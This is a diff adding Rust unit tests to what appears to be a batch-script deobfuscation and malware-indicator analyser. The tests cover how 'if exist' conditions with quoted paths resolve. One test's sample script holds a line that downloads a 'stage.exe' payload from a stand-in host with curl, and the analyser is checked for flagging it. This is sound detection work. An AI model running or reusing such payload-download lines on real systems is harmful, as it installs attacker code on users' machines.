@@ -7871,6 +7871,76 @@ mod if_tests {
         // The body "echo match" is never independently dispatched. Just verify no panic.
         let _ = report;
     }
+
+    #[test]
+    fn if_exist_quoted_path_with_spaces_resolves() {
+        let script = br#"echo payload>"C:\Users\Public\has space.txt"
+if exist "C:\Users\Public\has space.txt" set MARK=found
+echo %MARK%
+"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo found"),
+            "quoted if-exist path with spaces did not resolve:\n{}\ntraits={:?}",
+            report.deobfuscated,
+            report.traits
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, crate::traits::Trait::IfNotResolved { condition } if condition.contains("has space.txt"))),
+            "quoted if-exist path should not stay unresolved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn if_not_exist_empty_quoted_operand_resolves_true() {
+        let script = br#"if not exist "" echo empty-missing
+"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo empty-missing"),
+            "empty quoted if-exist operand should resolve false before NOT:\n{}\ntraits={:?}",
+            report.deobfuscated,
+            report.traits
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, crate::traits::Trait::IfNotResolved { condition } if condition.contains("exist \"\""))),
+            "empty quoted if-exist operand should not stay unresolved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn if_not_exist_unknown_quoted_path_with_spaces_does_not_skip_later_iocs() {
+        let script = br#"if not exist "C:\Program Files\missing marker" goto ownpc
+curl https://payload.example/stage.exe -o stage.exe
+:ownpc
+echo done
+"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated
+                .contains("curl https://payload.example/stage.exe -o stage.exe"),
+            "unknown quoted path with spaces should not be assumed absent and skip later IOCs:\n{}\ntraits={:?}",
+            report.deobfuscated,
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                crate::traits::Trait::Download { src, .. }
+                    if src == "https://payload.example/stage.exe"
+            )),
+            "later download IOC should still be extracted: {:?}",
+            report.traits
+        );
+    }
 }
 
 #[cfg(test)]
